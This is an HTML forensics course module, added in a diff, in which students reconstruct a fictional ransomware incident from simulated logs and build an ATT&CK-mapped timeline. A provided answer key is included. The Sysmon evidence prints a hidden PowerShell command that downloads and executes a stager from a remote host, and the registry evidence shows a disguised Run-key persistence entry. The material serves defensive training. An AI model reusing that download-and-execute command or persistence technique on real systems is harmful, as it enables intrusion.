@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DF-50: Timeline Capstone — Ransomware Investigation | Forensics Hub</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-dark: #090910; --bg-card: #111120; --bg-terminal: #0d1117;
+            --accent: #fbbf24; --accent-dim: rgba(251,191,36,0.12); --accent-border: rgba(251,191,36,0.25);
+            --green: #4ade80; --yellow: #fbbf24; --red: #f87171;
+            --text-primary: #e2e8f0; --text-secondary: #8b949e; --border: rgba(255,255,255,0.08);
+        }
+        body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; }
+        .fh-header { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .fh-header-left { display: flex; align-items: center; gap: 14px; }
+        .fh-badge { background: var(--accent); color: #000; padding: 4px 10px; border-radius: 4px; font-size: 0.72rem; font-weight: 700; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.5px; }
+        .fh-header h1 { font-size: 1.05rem; font-weight: 600; color: var(--accent); }
+        .fh-back { color: var(--text-secondary); padding: 6px 14px; border: 1px solid var(--border); border-radius: 6px; font-size: 0.85rem; transition: all 0.2s; text-decoration: none; }
+        .fh-back:hover { background: var(--accent); color: #000; border-color: var(--accent); }
+        .fh-breadcrumb { padding: 9px 24px; font-size: 12px; color: var(--text-secondary); background: rgba(9,9,16,0.6); border-bottom: 1px solid rgba(255,255,255,0.04); }
+        .fh-breadcrumb a { color: var(--accent); text-decoration: none; }
+        .fh-breadcrumb a:hover { opacity: 0.8; }
+        .fh-breadcrumb-sep { margin: 0 7px; color: #333; }
+        .content-panel { max-width: 820px; margin: 0 auto; padding: 30px 32px 60px; }
+        .section { margin-bottom: 36px; }
+        .section-title { font-size: 1.25rem; color: var(--accent); margin-bottom: 14px; display: flex; align-items: center; gap: 10px; }
+        .section-title::before { content: ''; width: 3px; height: 20px; background: var(--accent); border-radius: 2px; flex-shrink: 0; }
+        .objectives { background: var(--accent-dim); border-left: 3px solid var(--accent); padding: 16px 20px; border-radius: 0 8px 8px 0; margin-bottom: 28px; }
+        .objectives h2 { color: var(--accent); margin-bottom: 10px; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .objectives ul { list-style: none; }
+        .objectives li { padding: 4px 0 4px 20px; position: relative; color: var(--text-secondary); font-size: 0.9rem; }
+        .objectives li::before { content: '>'; position: absolute; left: 0; color: var(--accent); font-family: 'JetBrains Mono', monospace; }
+        .content-text { color: var(--text-secondary); margin-bottom: 14px; font-size: 0.95rem; line-height: 1.7; }
+        .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
+        .feature-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+        .feature-card strong { color: var(--accent); display: block; margin-bottom: 4px; font-size: 0.88rem; }
+        .feature-card span { color: var(--text-secondary); font-size: 0.84rem; line-height: 1.5; }
+        .code-block { background: var(--bg-terminal); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin: 14px 0; overflow-x: auto; }
+        .code-block-header { font-size: 0.72rem; color: var(--text-secondary); margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px; }
+        .code-block-header::before { content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
+        .code-block pre { font-family: 'JetBrains Mono', monospace; font-size: 0.83rem; line-height: 1.75; color: var(--text-primary); }
+        .cm { color: #6a737d; } .num { color: #79c0ff; } .out { color: var(--green); } .hl { color: var(--yellow); }
+        .callout { border-radius: 8px; padding: 16px 20px; margin: 20px 0; }
+        .callout--info { background: var(--accent-dim); border: 1px solid var(--accent-border); }
+        .callout--warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.25); }
+        .callout--danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.25); }
+        .callout h4 { font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .callout--info h4 { color: var(--accent); } .callout--warn h4 { color: var(--yellow); } .callout--danger h4 { color: var(--red); }
+        .callout p, .callout li { font-size: 0.88rem; color: var(--text-secondary); line-height: 1.6; }
+        .evidence-table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 0.87rem; }
+        .evidence-table th { background: rgba(251,191,36,0.08); color: var(--accent); font-weight: 600; text-align: left; padding: 10px 14px; border-bottom: 2px solid rgba(251,191,36,0.2); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .evidence-table td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-secondary); vertical-align: top; }
+        .evidence-table tr:hover td { background: rgba(251,191,36,0.04); }
+        .inline-code { background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px; font-family: 'JetBrains Mono', monospace; font-size: 0.83em; color: var(--accent); }
+        .try-it { background: rgba(74,222,128,0.06); border: 1px solid rgba(74,222,128,0.2); border-radius: 8px; padding: 18px 20px; margin: 20px 0; }
+        .try-it h3 { color: var(--green); margin-bottom: 10px; font-size: 0.95rem; }
+        .try-it p, .try-it li { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 6px; }
+        .try-it ol { padding-left: 20px; }
+        .takeaways { background: linear-gradient(135deg, rgba(251,191,36,0.08), rgba(251,191,36,0.04)); border: 1px solid var(--accent); border-radius: 8px; padding: 20px; margin: 25px 0; }
+        .takeaways h3 { color: var(--accent); margin-bottom: 12px; font-size: 1rem; }
+        .takeaways ul { list-style: none; }
+        .takeaways li { padding: 5px 0 5px 24px; position: relative; color: var(--text-secondary); font-size: 0.9rem; }
+        .takeaways li::before { content: '\2713'; position: absolute; left: 0; color: var(--green); font-weight: bold; }
+        .nav-footer { display: flex; justify-content: space-between; padding: 16px 0; margin-top: 30px; border-top: 1px solid var(--border); }
+        .nav-btn { display: flex; align-items: center; gap: 8px; padding: 10px 16px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); text-decoration: none; font-size: 0.9rem; transition: all 0.2s; }
+        .nav-btn:hover { border-color: var(--accent); background: var(--accent-dim); }
+        .nav-btn.primary { background: var(--accent); color: #000; border-color: var(--accent); }
+        .nav-btn.primary:hover { filter: brightness(1.1); }
+        @media (max-width: 700px) { .content-panel { padding: 20px 16px 40px; } .feature-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <header class="fh-header">
+        <div class="fh-header-left">
+            <span class="fh-badge">DF-50</span>
+            <h1>Timeline Capstone: Ransomware Investigation</h1>
+        </div>
+        <a href="../../index.html" class="fh-back">&lt; Forensics Hub</a>
+    </header>
+    <nav class="fh-breadcrumb" aria-label="Breadcrumb">
+        <a href="/dashboard.html">Dashboard</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        <a href="../../index.html">Forensics Hub</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        <a href="../../index.html">Log &amp; Timeline Analysis</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        DF-50: Timeline Capstone
+    </nav>
+
+    <div class="content-panel">
+        <div class="objectives">
+            <h2>Learning Objectives</h2>
+            <ul>
+                <li>Reconstruct a complete ransomware attack timeline from multiple evidence sources</li>
+                <li>Correlate Windows event logs, Sysmon, firewall, email, browser, registry, and file system evidence</li>
+                <li>Identify initial access, execution, persistence, lateral movement, and impact phases</li>
+                <li>Produce a professional investigation report with evidence citations</li>
+            </ul>
+        </div>
+
+        <section class="section">
+            <h2 class="section-title">Scenario: Ransomware Incident</h2>
+            <p class="content-text">On Monday 2026-03-16 at 06:15 UTC, the IT team at Meridian Financial Services discovered that the shared file server (FS01, 10.1.1.100) had been encrypted. All files had the <span class="inline-code">.lockbit3</span> extension. A ransom note named <span class="inline-code">README_RESTORE.txt</span> was found in every directory. You have been engaged to investigate.</p>
+            <p class="content-text">Your task is to analyze the evidence from seven sources, construct a complete attack timeline, and deliver a structured investigation report.</p>
+
+            <div class="callout callout--danger">
+                <h4>Scope</h4>
+                <p>Three systems are in scope: Workstation WS-JCOOPER (10.1.1.15), Domain Controller DC01 (10.1.1.10), and File Server FS01 (10.1.1.100). All timestamps are in UTC.</p>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 1: Email Headers</h2>
+            <div class="code-block">
+                <div class="code-block-header">Phishing email received by jcooper@meridian-financial.com</div>
+                <pre>Return-Path: &lt;billing@m3ridian-financial.com&gt;
+From: "Meridian Accounting" &lt;accounting@meridian-financial.com&gt;
+To: &lt;jcooper@meridian-financial.com&gt;
+Subject: Q1 2026 Invoice - Action Required
+Date: Fri, 14 Mar 2026 08:30:12 +0000
+Content-Type: multipart/mixed; boundary="--boundary123"
+X-Mailer: PHPMailer 6.5.3
+Authentication-Results: mx.meridian-financial.com;
+    spf=<span class="hl">fail</span>; dkim=<span class="hl">none</span>; dmarc=<span class="hl">fail</span>
+
+<span class="cm">Attachment: Q1_Invoice_2026.xlsm (macro-enabled spreadsheet)</span></pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 2: Browser History (WS-JCOOPER)</h2>
+            <div class="code-block">
+                <div class="code-block-header">Chrome History database -- key entries</div>
+                <pre>2026-03-14 08:32:15 | https://mail.meridian-financial.com/inbox | Link
+2026-03-14 08:32:44 | https://mail.meridian-financial.com/message/view/48291 | Link
+2026-03-14 08:33:01 | https://mail.meridian-financial.com/attachment/Q1_Invoice_2026.xlsm | Link</pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 3: Sysmon Logs (WS-JCOOPER)</h2>
+            <div class="code-block">
+                <div class="code-block-header">Sysmon Event ID 1 and 3 entries</div>
+                <pre><span class="cm"># Process Creation (Sysmon 1)</span>
+2026-03-14 08:33:22 | EXCEL.EXE launched Q1_Invoice_2026.xlsm
+    Parent: explorer.exe | User: MERIDIAN\jcooper
+
+2026-03-14 08:33:28 | <span class="hl">powershell.exe</span> -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.42/stager.ps1')"
+    Parent: <span class="hl">EXCEL.EXE</span> | User: MERIDIAN\jcooper
+
+2026-03-14 08:33:35 | <span class="hl">rundll32.exe</span> C:\Users\jcooper\AppData\Local\Temp\payload.dll,DllRegisterServer
+    Parent: powershell.exe | User: MERIDIAN\jcooper
+
+<span class="cm"># Network Connection (Sysmon 3)</span>
+2026-03-14 08:33:40 | rundll32.exe -> <span class="hl">198.51.100.42:443</span> (ESTABLISHED)
+2026-03-14 08:35:12 | rundll32.exe -> <span class="hl">198.51.100.42:443</span> (ESTABLISHED)</pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 4: Windows Security Events (DC01)</h2>
+            <div class="code-block">
+                <div class="code-block-header">Security.evtx -- Domain Controller</div>
+                <pre><span class="cm"># Credential access -- Kerberoasting</span>
+2026-03-14 09:15:33 | <span class="hl">4769</span> | Kerberos Service Ticket requested
+    Account: jcooper | Service: MSSQLSvc/SQL01.meridian.local
+    Encryption: <span class="hl">0x17 (RC4-HMAC)</span> <span class="cm">-- weak, Kerberoasting indicator</span>
+
+2026-03-14 09:15:34 | 4769 | Service: HTTP/WEB01.meridian.local | Encryption: 0x17
+2026-03-14 09:15:34 | 4769 | Service: CIFS/FS01.meridian.local | Encryption: 0x17
+
+<span class="cm"># Lateral movement -- admin logon to file server</span>
+2026-03-15 22:14:01 | <span class="hl">4624</span> | Logon Type 3 (Network)
+    Account: <span class="hl">svc_backup</span> | Source: 10.1.1.15 | Dest: DC01
+
+2026-03-15 22:14:05 | <span class="hl">4672</span> | Special privileges assigned to svc_backup
+
+<span class="cm"># Group policy modification</span>
+2026-03-15 23:45:00 | <span class="hl">4719</span> | System audit policy changed by svc_backup</pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 5: Firewall Logs</h2>
+            <div class="code-block">
+                <div class="code-block-header">Perimeter firewall -- relevant entries</div>
+                <pre>2026-03-14 08:33:30 ALLOW 10.1.1.15 -> 198.51.100.42:80 TCP <span class="cm"># stager download</span>
+2026-03-14 08:33:40 ALLOW 10.1.1.15 -> 198.51.100.42:443 TCP <span class="cm"># C2 beacon</span>
+2026-03-15 22:00:15 ALLOW 10.1.1.15 -> 198.51.100.42:443 TCP 847KB <span class="cm"># data exfil</span>
+2026-03-16 05:30:00 DENY  10.1.1.100 -> 198.51.100.42:443 TCP <span class="cm"># FS01 blocked</span></pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 6: Registry (WS-JCOOPER)</h2>
+            <div class="code-block">
+                <div class="code-block-header">NTUSER.DAT and SYSTEM hive artifacts</div>
+                <pre><span class="cm"># Persistence via Run key (NTUSER.DAT)</span>
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  "WindowsDefenderUpdate" = "rundll32.exe C:\Users\jcooper\AppData\Local\Temp\payload.dll,DllRegisterServer"
+  Last Written: 2026-03-14 08:34:01
+
+<span class="cm"># Recent Documents (NTUSER.DAT)</span>
+HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.xlsm
+  Last Written: 2026-03-14 08:33:22</pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Source 7: File System Timestamps (FS01)</h2>
+            <div class="code-block">
+                <div class="code-block-header">Key file timestamps from file server</div>
+                <pre><span class="cm"># Ransomware binary</span>
+C:\Windows\Temp\locker.exe
+  Created:  2026-03-16 05:28:44 | Modified: 2026-03-16 05:28:44
+
+<span class="cm"># Ransom notes</span>
+D:\Shared\Finance\README_RESTORE.txt
+  Created:  2026-03-16 05:30:22
+
+<span class="cm"># First encrypted file</span>
+D:\Shared\Finance\Q4_Report.xlsx.lockbit3
+  Modified: 2026-03-16 05:30:01
+
+<span class="cm"># Last encrypted file</span>
+D:\Shared\HR\Personnel\roster.xlsx.lockbit3
+  Modified: 2026-03-16 06:12:55</pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Complete Attack Timeline</h2>
+            <table class="evidence-table">
+                <thead>
+                    <tr>
+                        <th>Time (UTC)</th>
+                        <th>Event</th>
+                        <th>ATT&CK Tactic</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>Mar 14, 08:30</td><td>Phishing email delivered to jcooper (spoofed From, XLSM attachment)</td><td>Initial Access (T1566.001)</td></tr>
+                    <tr><td>Mar 14, 08:33</td><td>jcooper opens attachment in Excel, macro executes PowerShell stager</td><td>Execution (T1204.002)</td></tr>
+                    <tr><td>Mar 14, 08:33</td><td>PowerShell downloads payload.dll from C2 (198.51.100.42)</td><td>Execution (T1059.001)</td></tr>
+                    <tr><td>Mar 14, 08:33</td><td>rundll32.exe loads payload.dll, establishes C2 connection on 443</td><td>Command & Control (T1071.001)</td></tr>
+                    <tr><td>Mar 14, 08:34</td><td>Persistence via Run key "WindowsDefenderUpdate" in NTUSER.DAT</td><td>Persistence (T1547.001)</td></tr>
+                    <tr><td>Mar 14, 09:15</td><td>Kerberoasting -- RC4 service tickets requested for SQL, WEB, FS</td><td>Credential Access (T1558.003)</td></tr>
+                    <tr><td>Mar 14-15</td><td>Offline password cracking of Kerberos tickets (implied gap)</td><td>Credential Access</td></tr>
+                    <tr><td>Mar 15, 22:00</td><td>Data exfiltration from WS-JCOOPER to C2 (847KB)</td><td>Exfiltration (T1041)</td></tr>
+                    <tr><td>Mar 15, 22:14</td><td>Lateral movement: svc_backup authenticates to DC01 from WS-JCOOPER</td><td>Lateral Movement (T1021.002)</td></tr>
+                    <tr><td>Mar 15, 23:45</td><td>Audit policy modified via GPO (likely to disable security logging)</td><td>Defense Evasion (T1562.002)</td></tr>
+                    <tr><td>Mar 16, 05:28</td><td>Ransomware binary (locker.exe) deployed to FS01</td><td>Impact (T1486)</td></tr>
+                    <tr><td>Mar 16, 05:30</td><td>Encryption begins; C2 connection from FS01 blocked by firewall</td><td>Impact (T1486)</td></tr>
+                    <tr><td>Mar 16, 06:13</td><td>Encryption complete; ransom notes deployed</td><td>Impact (T1486)</td></tr>
+                    <tr><td>Mar 16, 06:15</td><td>IT team discovers encrypted file server</td><td>Discovery</td></tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Investigation Report Template</h2>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <strong>1. Executive Summary</strong>
+                    <span>High-level overview for non-technical leadership. Scope, impact, cause, and recommended actions in 1 page.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>2. Incident Timeline</strong>
+                    <span>Chronological event table with timestamps, descriptions, evidence sources, and ATT&CK mappings. The core deliverable.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>3. Evidence Inventory</strong>
+                    <span>List of all evidence collected: hashes, acquisition method, chain of custody, storage location.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>4. Technical Analysis</strong>
+                    <span>Detailed findings per evidence source. IOCs extracted (IPs, domains, file hashes, registry keys). Malware analysis summary.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>5. Root Cause Analysis</strong>
+                    <span>How the attack succeeded. Contributing factors: no email authentication (DMARC), macros enabled, service account with excessive privileges, no network segmentation.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>6. Recommendations</strong>
+                    <span>Immediate: Reset all credentials, isolate affected systems, block IOCs. Long-term: Implement DMARC, disable macros by policy, segment network, deploy EDR.</span>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <div class="try-it">
+                <h3>Capstone Exercise</h3>
+                <p>Using the evidence above, answer these investigation questions:</p>
+                <ol>
+                    <li>What was the dwell time (initial access to impact)?</li>
+                    <li>What credential was used for lateral movement, and how was it likely obtained?</li>
+                    <li>List all Indicators of Compromise (IOCs) from this investigation.</li>
+                    <li>What security controls failed, and what would you recommend?</li>
+                    <li>Why did the firewall block the FS01 C2 connection but allow the WS-JCOOPER one?</li>
+                </ol>
+                <p><strong style="color:var(--green)">Answers:</strong> (1) ~45 hours (Mar 14 08:33 to Mar 16 05:30). (2) svc_backup service account -- likely obtained via Kerberoasting (RC4 encrypted service tickets cracked offline). (3) IOCs: IP 198.51.100.42, domain m3ridian-financial.com, file payload.dll, file locker.exe, registry key "WindowsDefenderUpdate", extension .lockbit3. (4) No DMARC enforcement (phishing delivered), macros enabled (execution), service account in Domain Admins (privilege), flat network (lateral movement). (5) Likely because FS01 was on a server VLAN with stricter egress rules, while the workstation VLAN allowed outbound HTTPS -- demonstrating partial but insufficient network segmentation.</p>
+            </div>
+        </section>
+
+        <div class="takeaways">
+            <h3>Key Takeaways</h3>
+            <ul>
+                <li>Ransomware attacks follow a predictable kill chain: phishing, execution, persistence, credential access, lateral movement, impact</li>
+                <li>Dwell time reveals how long the attacker had access before encryption -- this determines the scope of compromise</li>
+                <li>Every evidence source fills gaps that others miss -- no single source tells the complete story</li>
+                <li>ATT&CK mapping structures your findings and enables comparison with known threat actor TTPs</li>
+                <li>A professional report requires both an executive summary and detailed technical analysis</li>
+                <li>Root cause analysis should identify contributing security control failures, not just the attack chain</li>
+            </ul>
+        </div>
+
+        <div class="nav-footer">
+            <a href="df-49-registry-forensics.module.html" class="nav-btn">&larr; Previous: Registry Forensics</a>
+            <span></span>
+        </div>
+    </div>
+
+    <script>
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.init({ moduleId: 'df-50', hubKey: 'hexworth_forensics_progress' });
+        }
+    </script>
+</body>
+</html>
